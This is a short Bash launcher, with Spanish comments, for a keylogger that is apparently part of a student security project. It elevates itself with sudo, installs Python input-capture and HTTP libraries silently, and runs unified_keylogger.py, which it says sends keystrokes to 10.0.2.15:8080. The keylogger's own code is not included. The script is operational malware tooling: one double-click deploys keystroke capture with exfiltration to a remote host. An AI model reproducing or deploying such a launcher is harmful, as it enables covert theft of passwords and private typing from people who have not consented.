
#!/bin/bash
# keylogger automatico - ejecutable con doble clic
# proyecto de seguridad informatica

clear
echo "keylogger automatico"
echo "==================="
echo ""

# verificar si estamos en el directorio correcto
if [ ! -f "unified_keylogger.py" ]; then
    echo "error: no se encontro unified_keylogger.py"
    echo "ejecuta este script desde el directorio del proyecto"
    read -p "presiona enter para salir..."
    exit 1
fi

# verificar si somos root (necesario para keylogger)
if [ "$EUID" -ne 0 ]; then
    echo "necesitas permisos de administrador"
    echo "relanzando con sudo..."
    exec sudo "$0" "$@"
fi

echo "permisos correctos"
echo "verificando dependencias..."

# verificar python3
if ! command -v python3 &> /dev/null; then
    echo "python3 no esta instalado"
    apt update && apt install -y python3
fi

# verificar e instalar dependencias
echo "instalando dependencias..."
apt update > /dev/null 2>&1
apt install -y python3-pynput python3-requests > /dev/null 2>&1

if [ $? -eq 0 ]; then
    echo "dependencias instaladas"
else
    echo "error instalando dependencias, continuando..."
fi

echo ""
echo "iniciando keylogger..."
echo "configurado para enviar a: 10.0.2.15:8080"
echo "presiona ctrl+c para detener"
echo ""

# iniciar el keylogger
python3 unified_keylogger.py

echo ""
echo "keylogger detenido"
read -p "presiona enter para salir..."
